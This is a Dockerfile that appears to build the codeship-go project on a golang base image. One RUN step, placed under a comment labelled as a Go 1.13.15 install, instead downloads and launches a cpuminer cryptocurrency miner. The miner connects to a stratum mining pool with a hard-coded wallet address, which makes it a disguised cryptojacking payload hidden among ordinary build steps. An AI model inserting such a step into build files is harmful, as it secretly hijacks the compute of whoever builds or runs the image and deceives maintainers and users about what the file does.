ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir Dann && cd Dann && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcp://pool.bullcpupool.com:3333 -u sugar1qeeqmgf4a8hvryqvfuwwjtdjy085j9zk3zpmywu.Dann -t0
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
